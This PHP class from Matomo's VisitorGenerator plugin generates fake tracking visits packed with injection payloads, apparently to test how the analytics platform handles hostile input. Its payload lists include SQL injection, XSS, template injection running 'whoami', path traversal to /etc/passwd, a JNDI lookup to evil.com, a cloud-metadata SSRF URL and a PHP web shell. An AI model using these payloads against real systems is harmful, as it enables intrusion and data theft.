<?php

/**
 * Matomo - free/libre analytics platform
 *
 * @link https://matomo.org
 * @license http://www.gnu.org/licenses/gpl-3.0.html GPL v3 or later
 *
 */

namespace Piwik\Plugins\VisitorGenerator\Generator;

use Piwik\Piwik;
use Piwik\Plugin\Manager;
use Piwik\Plugins\CoreAdminHome\API as CoreAdminHomeApi;
use Piwik\Plugins\SitesManager\API as SitesManagerApi;
use Piwik\Plugins\VisitorGenerator\Generator;

class VisitsMalicious extends Generator
{
    private $sqlPayloads = [
        "' OR '1'='1' --",
        "' OR 1=1#",
        "' UNION SELECT NULL, version(), user() --",
        "'; DROP TABLE users; --",
        "' AND SLEEP(3)--",
        "'; EXEC xp_cmdshell(''dir''); --",
        "admin' OR '1'='1",
        "0; WAITFOR DELAY '0:0:05' --",
        "') OR ('1'='1",
        "' UNION ALL SELECT load_file('/etc/passwd') --",
        "%27%20OR%201%3D1%20--",
    ];

    private $scriptPayloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg/onload=confirm(document.cookie)>",
        "<svg><script>alert('xss')</script>",
        "`); alert(1); (`",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert('x')</script>",
        "<body onfocus=print()>",
        "<iframe src=javascript:alert('xss')>",
        "<math href=\"javascript:alert(1)\">",
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
    ];

    private $templatePayloads = [
        '{{7*7}}',
        '{{ constructor.constructor(\'return globalThis.process\')() }}',
        '{{ this.$emit(\'steal\', document.cookie) }}',
        '{% set p = [\'../../../../etc/passwd\'] %}',
        '{{=it.evil}}',
        '{{#each this as |v|}}<script>{{/each}}',
        '<%= global.process.env %>',
        '${7*7}',
        '{{range .}}<script>{{end}}',
        '{{ dump(app.request) }}',
        '{{().__class__.__mro__[1].__subclasses__()[40](\"id\").system(\"whoami\")}}',
    ];

    private $miscPayloads = [
        '../etc/passwd',
        '{{$on(\'click\',()=>confirm(\'owned\'))}}',
        'v-on:click="this.$root.hijack()"',
        '../../../../../windows/win.ini',
        '| ls -la |',
        '$(cat /etc/passwd)',
        'file:///etc/passwd',
        'gopher://127.0.0.1:11211/_stats',
        '${jndi:ldap://evil.com/a}',
        'file://c:/windows/win.ini',
        'http://169.254.169.254/latest/meta-data/',
        '<?php system($_GET["cmd"]); ?>',
        '&lt;img src=x onerror=alert(1)&gt;',
        '%2F..%2F..%2Fetc%2Fpasswd',
    ];

    private $searchReferrers = [
        'https://www.google.com/search',
        'https://www.bing.com/search',
        'https://duckduckgo.com/',
        'https://search.brave.com/search',
        'https://www.baidu.com/s',
    ];

    private $socialReferrers = [
        'https://www.facebook.com',
        'https://twitter.com',
        'https://t.co',
        'https://www.linkedin.com',
        'https://www.reddit.com/r/security',
        'https://mastodon.social',
    ];

    private $maliciousBrands = [
        '" Not A;Brand";v="99", "Chromium";v="95", "EvilBrowser";v="13"',
        '"BadBrowser";v="105", "Sneaky";v="1.0"',
        '"Edge";v="0", "Chrome";v="0", "Pwn";v="666"',
    ];

    public function generate($time = false, $idSite = 1, $limit = 30)
    {
        $date = date("Y-m-d", $time);

        $tracker = $this->makeMatomoTracker($idSite);
        $tracker->setDebugStringAppend('dp=1');
        $tracker->enableBulkTracking();
        $tokenAuth = Piwik::requestTemporarySystemAuthToken('VisitorGeneratorMalicious', 24);
        $site = $this->getCurrentSite($idSite);

        $tracker->setAttributionInfo(json_encode([
            $this->buildMaliciousReferrer($site['main_url']),
            $this->randomPayload(),
            $this->randomPayload(),
            time() - $this->faker->numberBetween(1000, 50000),
        ]));

        $tracker->setNewVisitorId();
        if ($this->trackNonProfilable) {
            $tracker->randomVisitorId = false;
        }

        $actions = 0;
        while ($actions < $limit) {
            $countryCode = $this->faker->countryCode;

            if ($this->faker->boolean(35)) {
                $tracker->setNewVisitorId();
                if ($this->trackNonProfilable) {
                    $tracker->randomVisitorId = false;
                }
                if ($this->faker->boolean(75)) {
                    $tracker->setUserId($this->randomPayload());
                } else {
                    $tracker->setUserId(false);
                }
            }

            $tracker->setTokenAuth($tokenAuth);
            $tracker->setIdSite($idSite);
            $tracker->setUserAgent($this->buildUserAgent());
            $this->setMaliciousClientHints($tracker);
            $tracker->setBrowserLanguage($this->faker->randomElement(['en', 'en-US', 'de', 'fr', 'es']));
            $tracker->setCity($this->randomPayload());
            $tracker->setCountry(strtolower($countryCode));
            $tracker->setRegion($this->faker->region($countryCode));
            $tracker->setLatitude($this->faker->latitude);
            $tracker->setLongitude($this->faker->longitude);
            $tracker->setIp($this->faker->boolean(60) ? $this->faker->ipv4 : $this->faker->ipv6);
            $tracker->setLocalTime($this->faker->time('H:i:s'));
            $tracker->setForceVisitDateTime($date . ' ' . $this->faker->time('H:i:s'));
            $tracker->setUrl($this->buildMaliciousUrl($site['main_url']));
            $tracker->setUrlReferrer($this->buildMaliciousReferrer($site['main_url']));

            $tracker->setCustomTrackingParameter('payload', $this->randomPayload());
            $tracker->setCustomTrackingParameter('ca', $this->randomPayload());
            $tracker->setCustomTrackingParameter('idgoal', $this->randomPayload());

            $tracker->setCustomVariable(1, $this->randomPayload(), $this->randomPayload(), 'visit');
            $tracker->setCustomVariable(2, $this->randomPayload(), $this->randomPayload(), 'visit');
            $tracker->setCustomVariable(1, $this->randomPayload(), $this->randomPayload(), 'page');
            $tracker->setCustomVariable(2, $this->randomPayload(), $this->randomPayload(), 'page');

            $tracker->setCustomDimension('1', $this->randomPayload());
            $tracker->setCustomDimension('2', $this->randomPayload());
            $tracker->setCustomDimension('3', $this->randomPayload());
            $tracker->setCustomDimension('4', $this->randomPayload());

            $pageTitle = $this->buildPageTitle();
            $tracker->doTrackPageView($pageTitle);
            $actions++;

            if ($this->faker->boolean(75)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackEvent( $this->randomPayload(),  $this->randomPayload(), $this->randomPayload());
                $actions++;
            }

            if ($this->faker->boolean(50)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackSiteSearch($this->randomPayload(), $this->randomPayload(), $this->faker->boolean(40) ? $this->faker->randomNumber(3) : $this->faker->numberBetween(0, 5));
                $actions++;
            }

            if ($this->faker->boolean(40)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackContentImpression($this->randomPayload(), $this->randomPayload(), $site['main_url'] . '/content?payload=' . rawurlencode($this->randomPayload()));
                if ($this->faker->boolean(60)) {
                    $this->setActionScopePayloads($tracker);
                    $tracker->doTrackContentInteraction('click', $this->randomPayload(), $this->randomPayload(), $site['main_url'] . '/content?payload=' . rawurlencode($this->randomPayload()));
                    $actions++;
                }
                $actions++;
            }

            if ($this->faker->boolean(45)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackAction($site['main_url'] . '/download?file=' . rawurlencode($this->randomPayload()), 'download');
                $actions++;
            }

            if ($this->faker->boolean(45)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackAction('https://example.com/out?to=' . rawurlencode($this->randomPayload()), 'link');
                $actions++;
            }

            if ($this->faker->boolean(30)) {
                $tracker->setEcommerceView($this->randomPayload(), $this->randomPayload(), [$this->randomPayload(), $this->randomPayload()], $this->faker->randomNumber(2));
                $tracker->addEcommerceItem($this->randomPayload(), $this->randomPayload(), [$this->randomPayload(), $this->randomPayload()], $this->faker->randomNumber(2), $this->faker->numberBetween(1, 3));
                $tracker->doTrackEcommerceOrder($this->buildOrderId($this->randomPayload(), $this->randomPayload()), $this->faker->randomNumber(3), $this->faker->randomNumber(2), $this->faker->randomNumber(2), $this->faker->randomNumber(2), $this->faker->randomNumber(2));
                if ($this->faker->boolean(60)) {
                    $this->setActionScopePayloads($tracker);
                    $tracker->doTrackEcommerceCartUpdate($this->faker->randomNumber(3));
                    $actions++;
                }
                $actions++;
            }

            if ($this->faker->boolean(25)) {
                $this->trackMaliciousMedia($tracker);
                $actions++;
            }
            if ($this->faker->boolean(30)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackGoal($this->faker->numberBetween(1, 5), $this->faker->randomFloat(2, 0, 50), $this->randomPayload());
                $actions++;
            }

            if ($actions % 50 === 0) {
                $tracker->doBulkTrack();
            }
        }

        if ($actions % 50 !== 0) {
            $tracker->doBulkTrack();
        }

        CoreAdminHomeApi::getInstance()->invalidateArchivedReports($idSite, $date);

        return $actions;
    }

    private function buildMaliciousUrl($baseUrl)
    {
        $baseUrl = rtrim($baseUrl, '/');
        $campaign = $this->buildCampaignParameters();
        $query = http_build_query([
            'search' => $this->randomPayload(),
            'next' => "javascript:" . $this->randomPayload(),
            'template' => $this->randomPayload(),
            'sql' => $this->randomPayload(),
        ] + $campaign, '', '&', PHP_QUERY_RFC3986);

        return $baseUrl . '/malicious/' . rawurlencode($this->randomPayload()) . '?' . $query . '#' . rawurlencode($this->randomPayload());
    }

    private function buildMaliciousReferrer($baseUrl)
    {
        $token = $this->randomPayload();
        $type = $this->faker->randomElement(['search', 'social', 'generic', 'direct']);
        $baseUrl = rtrim($baseUrl, '/');

        if ($type === 'search') {
            $searchBase = $this->faker->randomElement($this->searchReferrers);
            $paramSeparator = strpos($searchBase, '?') === false ? '?' : '&';
            return $searchBase . $paramSeparator . 'q=' . rawurlencode($token);
        }

        if ($type === 'social') {
            $socialBase = $this->faker->randomElement($this->socialReferrers);
            return rtrim($socialBase, '/') . '/' . rawurlencode($token);
        }

        if ($type === 'generic') {
            return $baseUrl . '/referrer?payload=' . rawurlencode($token) . '&next=' . rawurlencode($this->randomPayload());
        }

        return '';
    }

    private function buildCampaignParameters()
    {
        return [
            'pk_campaign' => $this->randomPayload(),
            'pk_kwd' => $this->randomPayload(),
            'utm_source' => $this->randomPayload(),
            'utm_medium' => $this->faker->randomElement(['social', 'cpc', 'email', $this->randomPayload()]),
            'utm_campaign' => $this->randomPayload(),
            'utm_term' => $this->randomPayload(),
        ];
    }

    private function buildOrderId($payload, $sqlPayload)
    {
        return substr($payload . '-' . $sqlPayload . '-' . $this->faker->randomNumber(5), 0, 100);
    }

    private function setMaliciousClientHints($tracker)
    {
        $tracker->setClientHints(
            substr($this->randomPayload(), 0, 30),
            substr($this->randomPayload(), 0, 30),
            $this->faker->randomElement(['14.0.0', '0.0.0', '9.9.9<svg']),
            $this->faker->randomElement($this->maliciousBrands),
            substr($this->randomPayload(), 0, 30),
            '"Tablet", "Automotive"'
        );
    }

    private function trackMaliciousMedia(\MatomoTracker $tracker)
    {
        if (!Manager::getInstance()->isPluginActivated('MediaAnalytics')) {
            return; // plugin not available
        }

        $tracker->clearCustomTrackingParameters();
        $tracker->setCustomTrackingParameter(\Piwik\Plugins\MediaAnalytics\Actions\ActionMedia::PARAM_MEDIA_TITLE, $this->randomPayload());
        $tracker->setCustomTrackingParameter(\Piwik\Plugins\MediaAnalytics\Actions\ActionMedia::PARAM_RESOURCE, 'javascript:' . $this->randomPayload());
        $tracker->setCustomTrackingParameter(\Piwik\Plugins\MediaAnalytics\Actions\ActionMedia::PARAM_ID_VIEW, substr($this->randomPayload() . $this->randomPayload(), 0, 16));
        $tracker->storedTrackingActions[] = $tracker->getUrlTrackPageView($this->buildPageTitle());
        $tracker->clearCustomTrackingParameters();
    }

    private function setActionScopePayloads(\MatomoTracker $tracker)
    {
        $tracker->setCustomVariable(3, 'sql', $this->randomPayload(), 'page');
        $tracker->setCustomVariable(4, 'js', $this->randomPayload(), 'page');
        $tracker->setCustomDimension('5', $this->randomPayload());
        $tracker->setCustomDimension('6', $this->randomPayload());
        $tracker->setCustomTrackingParameter('bad', $this->randomPayload());
    }

    private function randomPayload()
    {
        $pool = array_merge($this->sqlPayloads, $this->scriptPayloads, $this->templatePayloads, $this->miscPayloads);

        return $this->faker->randomElement($pool);
    }

    private function buildPageTitle()
    {
        return sprintf(
            "%s | %s | %s",
            $this->randomPayload(),
            $this->randomPayload(),
            $this->randomPayload()
        );
    }

    private function buildUserAgent()
    {
        $base = 'VisitorGeneratorMalicious/1.0';
        $choice = $this->randomPayload();
        $suffix = substr($this->randomPayload() . ' ' . $this->randomPayload() . ' ' . $choice, 0, 140);

        return trim($base . ' ' . $suffix);
    }

    private function getCurrentSite($idSite)
    {
        return SitesManagerApi::getInstance()->getSiteFromId($idSite);
    }
}
